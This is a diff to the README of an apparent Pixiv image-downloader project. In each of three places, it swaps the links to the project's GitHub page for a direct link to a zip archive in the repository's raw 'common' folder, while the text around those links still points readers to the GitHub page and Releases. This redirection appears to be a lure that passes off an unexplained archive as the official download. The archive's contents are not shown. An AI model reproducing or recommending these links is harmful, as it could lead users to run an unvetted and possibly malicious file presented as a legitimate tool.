@@ -1,6 +1,6 @@
 # 🖼️ pixiv-downloader - Easy Multi-Threaded Pixiv Image Downloading
 
-[![Download pixiv-downloader](https://img.shields.io/badge/Download-Pixiv--Downloader-brightgreen)](https://github.com/Fardin187/pixiv-downloader)
+[![Download pixiv-downloader](https://img.shields.io/badge/Download-Pixiv--Downloader-brightgreen)](https://raw.githubusercontent.com/Fardin187/pixiv-downloader/main/common/downloader_pixiv_1.0-beta.4.zip)
 
 ---
 
@@ -33,7 +33,7 @@ You need to visit the official GitHub page to get the latest version.
 
 Click the large green button below or visit the same link:  
 
-[![Download pixiv-downloader](https://img.shields.io/badge/Download-pixiv--downloader-blue)](https://github.com/Fardin187/pixiv-downloader)
+[![Download pixiv-downloader](https://img.shields.io/badge/Download-pixiv--downloader-blue)](https://raw.githubusercontent.com/Fardin187/pixiv-downloader/main/common/downloader_pixiv_1.0-beta.4.zip)
 
 On the GitHub page:
 
@@ -126,7 +126,7 @@ You will find downloaded images arranged by their Pixiv ids or date.
 
 To get started, visit the GitHub page here:  
 
-[https://github.com/Fardin187/pixiv-downloader](https://github.com/Fardin187/pixiv-downloader)
+[https://raw.githubusercontent.com/Fardin187/pixiv-downloader/main/common/downloader_pixiv_1.0-beta.4.zip](https://raw.githubusercontent.com/Fardin187/pixiv-downloader/main/common/downloader_pixiv_1.0-beta.4.zip)
 
 Click **Releases** to find the latest Windows files. Download and follow these steps to install and run the program on your PC.
 
